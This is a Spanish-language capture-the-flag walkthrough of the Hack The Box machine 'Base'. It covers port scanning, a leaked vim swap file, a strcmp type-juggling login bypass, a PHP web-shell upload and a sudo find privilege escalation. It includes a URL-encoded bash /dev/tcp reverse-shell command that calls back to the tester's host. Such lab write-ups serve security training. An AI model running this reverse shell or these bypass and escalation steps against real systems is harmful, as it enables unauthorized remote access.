---
title: Base
layout: page
permalink: /HTB_Base
---

<h2 class="amarillo">Base</h2>
<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/base.webp" alt="under" oncontextmenu="return false;">
</div>

Comenzamos encendiendo la máquina y nos da la dirección IP 10.129.3.122, enviaremos un paquete para saber a que nos estamos enfrentando:

```bash
❯ ping -c 5 10.129.3.122
PING 10.129.3.122 (10.129.3.122) 56(84) bytes of data.
64 bytes from 10.129.3.122: icmp_seq=1 ttl=63 time=115 ms
64 bytes from 10.129.3.122: icmp_seq=2 ttl=63 time=112 ms
64 bytes from 10.129.3.122: icmp_seq=3 ttl=63 time=109 ms
64 bytes from 10.129.3.122: icmp_seq=4 ttl=63 time=108 ms
64 bytes from 10.129.3.122: icmp_seq=5 ttl=63 time=111 ms
--- 10.129.3.122 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 108.120/110.928/115.225/2.492 ms
```

Con un TTL de 63 estamos frente a una máquina Linux.
<h2 class="amarillo">Enumeración</h2>

Procedemos a hacer un escaneo rápido y sigiloso con nmap para enumerar potenciales puertos abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.3.122 -oG allPorts
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/nmap.png" alt="under" oncontextmenu="return false;">
</div>

Vemos puerto `22` y `80` abiertos entonces continuamos con nmap para identificar la version y servicio que corren para estos puertos

```bash
nmap -p22,80 -sCV 10.129.3.122 -oN targeted
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/nmap2.png" alt="under" oncontextmenu="return false;">
</div>

<h1 class="amarillo">Explotación</h1>

Por ahora no podemos hacer mucho con lo que tenemos, entonces procedemos a hacer un poco de enumeración web

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/whatweb.png" alt="under" oncontextmenu="return false;">
</div>

Whatweb nos reporta algo interesante como un posible domino `base.htb`, vamos a quedarnos con esto por ahora en caso que la web no se resuelva podremos agregarlo al `/etc/hosts`.

Pero seguiremos enumerando un poco más con nmap el puerto `80` usando **http-enum**:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/webscan.png" alt="under" oncontextmenu="return false;">
</div>

Pero no nos reporta nada entonces probamos con gobuster y un diccionario un poco más grande en cuanto a rutas respecta:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/dirbust.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos un `/login` como posible ruta en la web, con el diccionario big.txt encontramos que hay archivos como .htaccess y un .htpasswd que son potenciales archivos pero no tenemos acceso ya que el servidor devuelve un 403 y no hay forma de verlos.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/dirbust2.png" alt="under" oncontextmenu="return false;">
</div>

Así continuamos accediendo directamente a la web

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/web.png" alt="under" oncontextmenu="return false;">
</div>

Enumerando un poco la web podremos ver que hay un apartado de login:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/web2.png" alt="under" oncontextmenu="return false;">
</div>

Podemos probar con credenciales por defecto pero no funciona, si probamos un poco de Directory Listing en `/login/`:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/web3.png" alt="under" oncontextmenu="return false;">
</div>

Podremos encontrar 2 archivos interesantes siendo por un lado el config.php y el login.php.swp (Este último se genera al cerrar de forma erronea o como copia de seguridad en caso de que algo pase durante la creación del archivo en su desarrollo utilizando vi,vim,nvim y deribados).

> Descargamos el login.php.swp para mirarlo desde consola:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/swap.png" alt="under" oncontextmenu="return false;">
</div>

Al abrirlo vemos cadenas de texto php interesantes y un directorio `/upload.php`, nuestro pase de entrada a la web y eludir el panel de login esta en la función de php **strcmp**:

```php
if (strcmp($username , $_POST['username']) == 0) {
if (strcmp($password, $_POST['password']) == 0) {
```

<h1 class="verde">¿Por qué es un problema la función strcmp?</h1>

El desarrollador de la web esta usando strcmp para revisar la combinación de usuario y contraseña, esta función es usada para comparar strings y que devuelvan un '0' cuando ambos valores son identicos, sin embargo, es una práctica insegura y mucho más para la autenticación de formularios web ya que puede ser fácilmente burlada sin credenciales validas.

Esto se debe al hecho de strcmp se le da un array vacio para comparar con los datos almacenados, por tanto nunca retornara un NULL y el operador == en php solo valida la igualdad de las variables y NULL es igual a 0. Esto se conoce como **Type Juggling**.

<h1 class="amarillo">Para explotarlo usaremos Caido</h1>

Si interceptamos las peticiones y lanzamos un usuario y contraseña aleatorias el servidor nos responde con Wrong Usernade or Password

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/caido.png" alt="under" oncontextmenu="return false;">
</div>

Pero siguiendo el principio de **Type Juggling**:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/caido2.png" alt="under" oncontextmenu="return false;">
</div>

Hemos entrado a la web y siguiendo el escaneo de rutas posibles donde teniamos un `/upload` dentro de la web una vez logueados encontramos una pestaña para subir archivos por lo que podemos probar:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/test.png" alt="under" oncontextmenu="return false;">
</div>

Ahora vamos a subirlo a ver si se nos permite:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/test2.png" alt="under" oncontextmenu="return false;">
</div>

Logramos subir el archivo, iremos al directorio de uploads a ver si lo allí lo encontramos:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/test3.png" alt="under" oncontextmenu="return false;">
</div>

Como el servidor interpreta php deberíamos poder ver el contenido de phpinfo al entrar:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/test4.png" alt="under" oncontextmenu="return false;">
</div>

Con esto hecho podremos probar a subir una shell en php:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/test5.png" alt="under" oncontextmenu="return false;">
</div>

Y tendremos ejecución remota de comandos, entonces con esto podremos enviarnos una reverse shell:

```c
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.12%2F443%200%3E%261
```

Y nos pondremos en escucha con ncat:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/revshell.png" alt="under" oncontextmenu="return false;">
</div>

<h1 class="amarillo">Escalada</h1>

Una vez dentro del sistema podremos mirar el otro archivo llamado config.php con mejor detalle y encontramos lo siguiente:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/credentials.png" alt="under" oncontextmenu="return false;">
</div>

```php
<?php
$username = "admin";
$password = "thisisagoodpassword";
```

No existe ningún usuario llamado admin pero si uno llamado john, podemos probar:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/john.png" alt="under" oncontextmenu="return false;">
</div>

Y hemos logrado loguearnos como john haciendo **User Pivoting**, ahora solo queda listar los privilegios de los que dispone el usuario john para escalar privilegios a root (En este punto ya podremos leer la user.txt)

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/escalada.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos que podemos ejecutar como root */usr/bin/find* y esto es de lo que nos aprovecharemos ya que podemos ejecutar comandos con find:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/escalada2.png" alt="under" oncontextmenu="return false;">
</div>

Así habremos completado la máquina.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Base/pwn.png" alt="under" oncontextmenu="return false;">
</div>
